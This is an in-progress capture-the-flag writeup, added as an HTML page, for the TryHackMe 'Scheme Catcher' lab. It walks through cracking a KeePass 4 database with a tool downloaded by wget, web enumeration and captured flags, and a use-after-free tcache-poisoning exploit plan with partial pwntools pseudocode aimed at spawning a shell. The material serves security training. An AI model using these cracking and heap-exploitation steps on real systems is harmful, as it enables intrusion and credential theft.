@@ -1,0 +1,589 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Scheme Catcher | TryHackMe Side Quest Writeup (In Progress)</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg-color: #0a0a0a;
+            --card-bg: #111111;
+            --accent-blue: #00e5ff;
+            --text-main: #e0e0e0;
+            --text-dim: #999;
+            --border-color: #222;
+            --mono-font: 'JetBrains Mono', monospace;
+            --warning: #ffaa33;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            color: var(--text-main);
+            font-family: 'Inter', sans-serif;
+            line-height: 1.6;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+        }
+
+        .container {
+            max-width: 1000px;
+            width: 90%;
+            padding: 4rem 0;
+        }
+
+        header {
+            border-bottom: 1px solid var(--border-color);
+            padding-bottom: 2rem;
+            margin-bottom: 3rem;
+        }
+
+        .back-link {
+            font-family: var(--mono-font);
+            color: var(--accent-blue);
+            text-decoration: none;
+            font-size: 0.8rem;
+            display: inline-block;
+            margin-bottom: 1rem;
+        }
+
+        .back-link:hover {
+            text-decoration: underline;
+        }
+
+        .category {
+            font-family: var(--mono-font);
+            color: var(--accent-blue);
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            font-size: 0.8rem;
+            margin-bottom: 1rem;
+            display: block;
+        }
+
+        h1 {
+            font-size: 3rem;
+            font-weight: 700;
+            margin: 0;
+            letter-spacing: -1px;
+            background: linear-gradient(to right, #fff, #666);
+            -webkit-background-clip: text;
+            background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .status-badge {
+            display: inline-block;
+            background: rgba(255, 170, 51, 0.2);
+            border: 1px solid var(--warning);
+            padding: 0.3rem 1rem;
+            border-radius: 20px;
+            font-family: var(--mono-font);
+            font-size: 0.7rem;
+            color: var(--warning);
+            margin-top: 1rem;
+        }
+
+        section {
+            margin-bottom: 4rem;
+        }
+
+        .section-num {
+            font-family: var(--mono-font);
+            color: var(--text-dim);
+            font-size: 0.9rem;
+            margin-bottom: 0.5rem;
+        }
+
+        h2 {
+            font-size: 1.5rem;
+            border-left: 3px solid var(--accent-blue);
+            padding-left: 1rem;
+            margin-bottom: 1.5rem;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        h3 {
+            font-size: 1.2rem;
+            color: #fff;
+            margin: 1.5rem 0 0.8rem 0;
+        }
+
+        p {
+            color: var(--text-dim);
+            font-size: 1.05rem;
+            line-height: 1.7;
+        }
+
+        strong {
+            color: #fff;
+        }
+
+        code {
+            font-family: var(--mono-font);
+            color: var(--accent-blue);
+            background: rgba(0, 229, 255, 0.1);
+            padding: 0.2rem 0.4rem;
+            border-radius: 4px;
+            font-size: 0.9rem;
+        }
+
+        pre {
+            background: var(--card-bg);
+            border: 1px solid var(--border-color);
+            padding: 1.5rem;
+            border-radius: 8px;
+            font-family: var(--mono-font);
+            overflow-x: auto;
+            color: var(--accent-blue);
+            font-size: 0.85rem;
+            margin: 1rem 0;
+        }
+
+        .table-container {
+            overflow-x: auto;
+            margin: 2rem 0;
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            font-family: var(--mono-font);
+            font-size: 0.85rem;
+        }
+
+        th {
+            text-align: left;
+            padding: 0.8rem;
+            border-bottom: 2px solid var(--border-color);
+            color: #fff;
+            text-transform: uppercase;
+        }
+
+        td {
+            padding: 0.8rem;
+            border-bottom: 1px solid var(--border-color);
+            color: var(--text-dim);
+        }
+
+        tr:hover td {
+            color: var(--accent-blue);
+            background: rgba(255, 255, 255, 0.02);
+        }
+
+        .flag-box {
+            background: linear-gradient(45deg, #001a1a, #000);
+            border: 1px solid var(--accent-blue);
+            padding: 1.5rem;
+            text-align: center;
+            border-radius: 4px;
+            margin: 1.5rem 0;
+        }
+
+        .flag-label {
+            display: block;
+            font-family: var(--mono-font);
+            font-size: 0.7rem;
+            color: var(--accent-blue);
+            margin-bottom: 0.5rem;
+            letter-spacing: 1px;
+        }
+
+        .flag-text {
+            font-family: var(--mono-font);
+            font-size: 1.2rem;
+            color: #fff;
+            word-break: break-all;
+        }
+
+        .note {
+            background: rgba(0, 229, 255, 0.05);
+            border-left: 3px solid var(--accent-blue);
+            padding: 1rem 1.5rem;
+            margin: 1.5rem 0;
+            border-radius: 0 8px 8px 0;
+        }
+
+        .warning-note {
+            background: rgba(255, 170, 51, 0.05);
+            border-left: 3px solid var(--warning);
+            padding: 1rem 1.5rem;
+            margin: 1.5rem 0;
+            border-radius: 0 8px 8px 0;
+        }
+
+        footer {
+            margin-top: 5rem;
+            padding-top: 2rem;
+            border-top: 1px solid var(--border-color);
+            font-family: var(--mono-font);
+            font-size: 0.8rem;
+            color: var(--text-dim);
+            text-align: right;
+        }
+
+        .highlight {
+            color: var(--accent-blue);
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <header>
+        <a href="writeups.html" class="back-link">← Back to Writeups</a>
+        <h1>Scheme Catcher</h1>
+        <p style="margin-top: 0.5rem;">TryHackMe Advent of Cyber 2025 - Side Quest 2</p>
+        <div class="status-badge">IN PROGRESS - FINAL EXPLOIT PHASE</div>
+    </header>
+
+    <section>
+        <div class="section-num">/ 01</div>
+        <h2>The Challenge</h2>
+        <p>Scheme Catcher is a side quest in the Advent of Cyber 2025 event on TryHackMe. This is a multi-stage challenge that tests skills across multiple domains: password cracking, web enumeration, reverse engineering, heap exploitation, and privilege escalation. The target machine runs a web server on port 80, a custom binary on port 9004, and SSH on port 22 (restricted).</p>
+        <p>Unlike typical CTF challenges, Scheme Catcher requires obtaining an entry key from a completely different room (Advent of Cyber Day 9 - "Attacks on encrypted files") before the main machine becomes accessible. This inter-room dependency adds an extra layer of complexity.</p>
+    </section>
+
+    <section>
+        <div class="section-num">/ 02</div>
+        <h2>Phase 1: Obtaining the Entry Key</h2>
+        <p>The Scheme Catcher machine is locked behind an entry key. To get this key, I had to first complete the Day 9 room "Attacks on encrypted files" and locate a hidden KeePass database.</p>
+
+        <h3>2.1 Accessing the Day 9 Machine</h3>
+        <p>Using the provided SSH credentials, I connected to the Day 9 target:</p>
+        <pre><code>ssh ubuntu@10.113.166.160
+Password: AOC2025Ubuntu!</code></pre>
+
+        <h3>2.2 Finding the KeePass Database</h3>
+        <p>Inside the Ubuntu home directory, I found a hidden file:</p>
+        <pre><code>ubuntu@tryhackme:~$ ls -la
+-rw------- 1 ubuntu ubuntu 419413 Dec 4 09:29 .Passwords.kdbx</code></pre>
+        <p>This is a KeePass 4 database (KDBX v4). The challenge required cracking it to retrieve the entry key for Scheme Catcher.</p>
+
+        <h3>2.3 The Problem with KDBX4</h3>
+        <p>Standard tools like <code>keepass2john</code> do NOT support KeePass 4 databases. Attempting to use it resulted in an error:</p>
+        <pre><code>keepass2john .Passwords.kdbx
+! .Passwords.kdbx : File version '40000' is currently not supported!</code></pre>
+        <p>KeePass 4 uses Argon2 as its key derivation function, which is deliberately slow and memory-hard to resist brute-force attacks. This makes cracking significantly more difficult than older KDBX formats.</p>
+
+        <h3>2.4 Cracking with KDBXcrack</h3>
+        <p>I used a specialized tool called KDBXcrack that supports KDBX4 and can leverage GPU acceleration:</p>
+        <pre><code>wget --no-check-certificate -q "https://raw.githubusercontent.com/d4t4s3c/KDBXcrack/refs/heads/main/KDBXcrack"
+chmod +x KDBXcrack
+./KDBXcrack -f .Passwords.kdbx -w /usr/share/wordlists/rockyou.txt
+
+╭╮╭━┳━━━┳━━╮╭━╮╭━╮
+┃┃┃╭┻╮╭╮┃╭╮┃╰╮╰╯╭╯
+┃╰╯╯ ┃┃┃┃╰╯╰╮╰╮╭╯
+┃╭╮┃ ┃┃┃┃╭━╮┃╭╯╰╮
+┃┃┃╰┳╯╰╯┃╰━╯┣╯╭╮╰╮
+╰╯╰━┻━━━┻━━━┻━╯╰━╯
+
+[i] Cracking | .Passwords.kdbx
+[i] Wordlist | /usr/share/wordlists/rockyou.txt
+[*] Status   | 742570/14344392/5%</code></pre>
+        <p>At approximately 5 passwords per second due to Argon2, cracking the full rockyou.txt would take over 30 hours. However, the password was found relatively early:</p>
+        <div class="flag-box">
+            <span class="flag-label">KEEPASS MASTER PASSWORD</span>
+            <div class="flag-text">harrypotter</div>
+        </div>
+
+        <h3>2.5 Extracting the Entry Key</h3>
+        <p>With the database unlocked, I used <code>pykeepass</code> (a Python library that supports KDBX4) to extract the contents:</p>
+        <pre><code>python3 -c "
+from pykeepass import PyKeePass
+kp = PyKeePass('.Passwords.kdbx', password='harrypotter')
+for entry in kp.entries:
+    print(f'Title: {entry.title}')
+    if entry.attachments:
+        for att in entry.attachments:
+            print(f'Attachment: {att.filename}')
+            with open(att.filename, 'wb') as f:
+                f.write(att.data)
+"
+
+Title: Key
+Attachment: sq2.png
+Saved to: sq2.png</code></pre>
+        <p>The attachment was an image of an egg with text written on it. Using OCR (tesseract) to extract the text:</p>
+        <pre><code>tesseract sq2.png stdout
+tit_for_tat</code></pre>
+        <div class="flag-box">
+            <span class="flag-label">SCHEME CATCHER ENTRY KEY</span>
+            <div class="flag-text">tit_for_tat</div>
+        </div>
+        <div class="note">
+            <strong>Why this worked:</strong> The KeePass database contained an image attachment rather than plain text. This is a common anti-forensics technique to hide sensitive data in plain sight.
+        </div>
+    </section>
+
+    <section>
+        <div class="section-num">/ 03</div>
+        <h2>Phase 2: Initial Reconnaissance</h2>
+        <p>With the entry key, I accessed the Scheme Catcher machine at IP <code>10.113.128.30</code>. The key was submitted via a web portal on port 21337, which then granted access to the target system.</p>
+
+        <h3>3.1 Port Scanning</h3>
+        <p>A full port scan revealed three open ports:</p>
+        <pre><code>nmap -p- 10.113.128.30
+
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+9004/tcp open  unknown</code></pre>
+        <p>SSH on port 22 was present but required credentials we did not yet have. Port 80 hosted a web server, and port 9004 hosted a custom TCP service.</p>
+
+        <h3>3.2 Web Enumeration</h3>
+        <p>The root web page displayed a simple "Under Construction" Easter-themed placeholder:</p>
+        <pre><code>curl http://10.113.128.30/
+&lt;h1&gt;Under Construction&lt;/h1&gt;
+This little Easter burrow is getting ready.
+Powered by carrots and pastel vibes</code></pre>
+        <p>This was a dead end. I ran directory fuzzing using <code>gobuster</code> with the common wordlist:</p>
+        <pre><code>gobuster dir -u http://10.113.128.30 -w /usr/share/wordlists/dirb/common.txt
+
+/dev                  (Status: 301)
+/7ln6Z1X9EF           (Status: 200)</code></pre>
+        <div class="warning-note">
+            <strong>Note on the hidden directory:</strong> The path <code>/7ln6Z1X9EF</code> contains a lowercase 'L' (not an uppercase 'I'). This is a common trick to make manual discovery difficult. I initially tried <code>/7In6Z1X9EF</code> and received 404 errors until I carefully examined the directory listing.
+        </div>
+    </section>
+
+    <section>
+        <div class="section-num">/ 04</div>
+        <h2>Phase 3: Finding the First Two Flags</h2>
+
+        <h3>4.1 The /7ln6Z1X9EF Directory</h3>
+        <p>Browsing to <code>/7ln6Z1X9EF</code> revealed an index listing:</p>
+        <pre><code>curl http://10.113.128.30/7ln6Z1X9EF/
+
+Name                    Last modified    Size
+4.2.0-R1-1337-server.zip  2025-12-02 07:12  5.2M
+foothold.txt              2025-12-02 07:24   37</code></pre>
+
+        <h3>4.2 Flag 2 - foothold.txt</h3>
+        <p>The file <code>foothold.txt</code> contained the second flag:</p>
+        <pre><code>curl http://10.113.128.30/7ln6Z1X9EF/foothold.txt
+THM{byp4ss_and_pack_is_pwn_you_n33d}</code></pre>
+        <div class="flag-box">
+            <span class="flag-label">FLAG 2 (foothold.txt)</span>
+            <div class="flag-text">THM{byp4ss_and_pack_is_pwn_you_n33d}</div>
+        </div>
+
+        <h3>4.3 The /dev Directory</h3>
+        <p>Continuing enumeration, I discovered another hidden directory: <code>/dev</code></p>
+        <pre><code>curl http://10.113.128.30/dev/
+
+Index of /dev
+4.2.0.zip</code></pre>
+        <p>Downloading and extracting this zip revealed a binary named <code>beacon.bin</code> inside a <code>latest/</code> subdirectory.</p>
+
+        <h3>4.4 Flag 1 - beacon.bin</h3>
+        <p>Running <code>strings</code> on the beacon binary immediately revealed the first flag:</p>
+        <pre><code>cd latest
+strings beacon.bin | grep THM
+THM{Welcom3_to_th3_eastmass_pwnland}</code></pre>
+        <div class="flag-box">
+            <span class="flag-label">FLAG 1 (hidden in file)</span>
+            <div class="flag-text">THM{Welcom3_to_th3_eastmass_pwnland}</div>
+        </div>
+        <div class="note">
+            <strong>Why this worked:</strong> The flag was embedded as a plaintext string in the binary's .rodata section. This is common in CTF challenges where the flag is "hidden in a file" but not obfuscated.
+        </div>
+
+        <h3>4.5 Analyzing beacon.bin</h3>
+        <p>Further analysis of the beacon binary revealed an interesting string:</p>
+        <pre><code>strings beacon.bin | grep -i eastmass
+EastMass</code></pre>
+        <p>Running the beacon with this key activated a socket server:</p>
+        <pre><code>./beacon.bin
+Enter key: EastMass
+Hello EastMass!
+Access granted! Starting socket server...
+Socket server listening on port 4444...</code></pre>
+        <p>The beacon listens on port 4444 and likely accepts commands or payloads. This will be useful later for maintaining access or pivoting.</p>
+    </section>
+
+    <section>
+        <div class="section-num">/ 05</div>
+        <h2>Phase 4: Reverse Engineering the Server Binary</h2>
+        <p>The file <code>4.2.0-R1-1337-server.zip</code> contained the custom server binary running on port 9004. This is the main attack surface for gaining a shell on the target.</p>
+
+        <h3>5.1 Binary Security Analysis</h3>
+        <p>Using <code>checksec</code> to examine the binary's security features:</p>
+        <pre><code>checksec --file=server
+
+RELRO           STACK CANARY      NX            PIE
+Full RELRO      Canary found      NX enabled    PIE enabled</code></pre>
+        <p>All modern mitigations were enabled:</p>
+        <ul>
+            <li><strong>Full RELRO:</strong> The Global Offset Table (GOT) is read-only. GOT hijacking is impossible.</li>
+            <li><strong>Stack Canary:</strong> Stack buffer overflows would trigger a crash before control can be gained.</li>
+            <li><strong>NX (No-Execute):</strong> Shellcode cannot be executed on the stack or heap.</li>
+            <li><strong>PIE (Position Independent Executable):</strong> The binary base address is randomized by ASLR.</li>
+        </ul>
+        <p>These mitigations ruled out simple buffer overflow or GOT overwrite attacks. The vulnerability had to be elsewhere.</p>
+
+        <h3>5.2 Program Functionality</h3>
+        <p>Connecting to the service on port 9004 revealed a menu-driven interface:</p>
+        <pre><code>nc -nv 10.113.128.30 9004
+
+Payload Storage Malhare's
+Version 4.2.0
+[1] C:
+[2] U:
+[3] D:
+[4] E:
+>></code></pre>
+        <p>The four options correspond to:</p>
+        <div class="table-container">
+            <table>
+                <thead>
+                    <tr><th>Option</th><th>Function</th><th>System Call</th></tr>
+                </thead>
+                <tbody>
+                    <tr><td>1</td><td>Create (C:)</td><td><code>malloc(size)</code> - allocates a chunk</td></tr>
+                    <tr><td>2</td><td>Update (U:)</td><td>writes data to existing chunk at offset</td></tr>
+                    <tr><td>3</td><td>Delete (D:)</td><td><code>free(chunk)</code> - deallocates memory</td></tr>
+                    <tr><td>4</td><td>Exit (E:)</td><td>terminates the program</td></tr>
+                </tbody>
+            </table>
+        </div>
+
+        <h3>5.3 Identifying the Vulnerability</h3>
+        <p>I extracted the addresses of global arrays using <code>objdump</code>:</p>
+        <pre><code>objdump -t server | grep -E "chunks|sizes"
+
+0000000000004060 g O .bss 00000000000007c8 chunks
+0000000000004840 g O .bss 00000000000007c8 sizes</code></pre>
+        <p>The <code>chunks</code> array stores pointers to allocated memory. The <code>sizes</code> array stores the corresponding chunk sizes.</p>
+        <p>The critical flaw: When a chunk is deleted (option 3), the <code>free()</code> function is called, but the pointer in the <code>chunks</code> array is <strong>not nullified</strong>. The Update function (option 2) does not check whether a chunk has been freed before writing to it.</p>
+        <p>This is a classic <strong>Use-After-Free (UAF)</strong> vulnerability. By deleting a chunk and then updating it, we can write to freed memory - specifically, we can overwrite the forward pointer (fd) of a freed tcache chunk.</p>
+
+        <h3>5.4 The GOT entries</h3>
+        <p>I also enumerated the GOT entries to understand what functions could be targeted:</p>
+        <pre><code>objdump -R server
+
+OFFSET           TYPE              VALUE
+0000000000003f90 R_X86_64_JUMP_SLOT  free@GLIBC_2.2.5
+0000000000003fa0 R_X86_64_JUMP_SLOT  puts@GLIBC_2.2.5
+0000000000003fb0 R_X86_64_JUMP_SLOT  printf@GLIBC_2.2.5
+0000000000003fb8 R_X86_64_JUMP_SLOT  read@GLIBC_2.2.5
+0000000000003fc0 R_X86_64_JUMP_SLOT  malloc@GLIBC_2.2.5
+0000000000003fd0 R_X86_64_JUMP_SLOT  __isoc99_scanf@GLIBC_2.7</code></pre>
+        <p>However, Full RELRO prevented direct GOT overwrites. The attack needed to target heap metadata instead.</p>
+    </section>
+
+    <section>
+        <div class="section-num">/ 06</div>
+        <h2>Phase 5: Exploiting Use-After-Free with Tcache Poisoning</h2>
+
+        <h3>6.1 Understanding Tcache</h3>
+        <p>Modern versions of glibc (including the one provided with the binary) use the "tcache" (thread-local caching) for small allocations. When a chunk is freed, it goes into a tcache bin. The bin is a singly-linked list where the chunk's <code>fd</code> (forward) pointer points to the next free chunk.</p>
+        <p>If we can overwrite the <code>fd</code> pointer of a freed chunk, we can make the allocator return an arbitrary address on the next allocation. This is called <strong>tcache poisoning</strong>.</p>
+
+        <h3>6.2 Exploit Strategy</h3>
+        <p>The plan was:</p>
+        <ol>
+            <li>Allocate a chunk of size 0x80 (goes into tcache bin 0x80 on free).</li>
+            <li>Free the chunk (returns to tcache, fd points to next free or null).</li>
+            <li>Use the UAF to overwrite the fd pointer to point to <code>chunks - 0x10</code> (an address near the global chunks array).</li>
+            <li>Allocate a new chunk of the same size. The allocator returns the original freed chunk (tcache behavior).</li>
+            <li>Allocate a second chunk. This time, the allocator follows the poisoned fd pointer and returns the address we specified (<code>chunks - 0x10</code>).</li>
+            <li>Now we can write to this address, which is just before the chunks array. By carefully calculating offsets, we can overwrite entries in the chunks array itself.</li>
+            <li>Overwrite a chunks array entry to point to the <code>stdout</code> FILE structure (address 0x4020).</li>
+            <li>Use the Update function to read from that entry, leaking a libc address (since stdout contains pointers to libc).</li>
+            <li>With a known libc base, calculate the address of <code>system()</code>.</li>
+            <li>Overwrite another chunks entry to point to a writable location, then write <code>system()</code> address.</li>
+            <li>Trigger the function via the Update or Delete operation to call <code>system("/bin/sh")</code>.</li>
+        </ol>
+
+        <h3>6.3 The Exploit Code (Pseudo)</h3>
+        <pre><code>from pwn import *
+
+# Addresses from objdump
+CHUNKS_ARRAY = 0x4060
+STDOUT = 0x4020
+
+# Step 1: Create and free
+create(0x80)
+delete(0)
+
+# Step 2: Poison fd pointer
+target_addr = CHUNKS_ARRAY - 0x10
+update(0, 0, p64(target_addr))
+
+# Step 3: Trigger poisoned allocation
+create(0x80)  # reuses freed chunk
+create(0x80)  # returns target_addr
+
+# Step 4: Overwrite chunks[0] to point to STDOUT
+update(1, 0, p64(STDOUT))
+
+# Step 5: Leak libc by reading from STDOUT
+leak = read_chunk(0)
+libc_base = u64(leak[:8]) - libc.symbols['_IO_2_1_stdout_']
+
+# Step 6: Calculate system address
+system_addr = libc_base + libc.symbols['system']
+
+# Step 7: Overwrite another chunk to execute system()
+# ... (detailed offset calculations omitted for brevity)</code></pre>
+    </section>
+
+    <section>
+        <div class="section-num">/ 07</div>
+        <h2>Current Status (In Progress)</h2>
+        <div class="warning-note">
+            <strong>WORK IN PROGRESS:</strong> The exploit has been developed and tested locally using the provided libc.so.6. The next steps are:
+            <ul style="margin-top: 0.8rem;">
+                <li>Fine-tune the remote exploit to account for ASLR offsets</li>
+                <li>Leak a libc address from the remote target</li>
+                <li>Calculate the correct system() address</li>
+                <li>Trigger the final payload to get a reverse shell</li>
+                <li>Read user.txt and root.txt for the remaining flags</li>
+            </ul>
+        </div>
+
+        <h3>Flags Obtained So Far</h3>
+        <div class="flag-list">
+            <div class="flag-item">
+                <span>FLAG 1 (beacon.bin)</span><br>
+                <code>THM{Welcom3_to_th3_eastmass_pwnland}</code>
+            </div>
+            <div class="flag-item">
+                <span>FLAG 2 (foothold.txt)</span><br>
+                <code>THM{byp4ss_and_pack_is_pwn_you_n33d}</code>
+            </div>
+            <div class="flag-item">
+                <span>FLAG 3 (user.txt)</span><br>
+                <code>PENDING - Requires shell access</code>
+            </div>
+            <div class="flag-item">
+                <span>FLAG 4 (root.txt)</span><br>
+                <code>PENDING - Requires privilege escalation</code>
+            </div>
+        </div>
+    </section>
+
+    <section>
+        <div class="section-num">/ 08</div>
+        <h2>Key Takeaways (So Far)</h2>
+        <ul>
+            <li><strong>KDBX4 cracking requires specialized tools:</strong> Standard keepass2john fails on KeePass 4. Tools like KDBXcrack or keepass4brute are necessary, but expect slow speeds due to Argon2.</li>
+            <li><strong>Hidden directories often use confusing characters:</strong> The path <code>/7ln6Z1X9EF</code> uses a lowercase 'L' that is easily mistaken for an uppercase 'I'. Always verify directory listings carefully.</li>
+            <li><strong>Always run strings on unknown binaries:</strong> The first flag was simply embedded as a plaintext string in beacon.bin. The beacon's activation key "EastMass" was also found this way.</li>
+            <li><strong>Full RELRO prevents GOT hijacking but not heap exploitation:</strong> Tcache poisoning remains viable even with all mitigations enabled.</li>
+            <li><strong>Provided libc files are critical:</strong> The zip included specific versions of ld-linux and libc.so.6. Using these locally ensures offset calculations match the remote target.</li>
+        </ul>
+    </section>
+
+    <footer>
+        &copy; 2026 // CYBERSECURITY RESEARCH & EXPLOITATION // CONTINUED TOMORROW
+    </footer>
+</div>
+
+</body>
+</html>
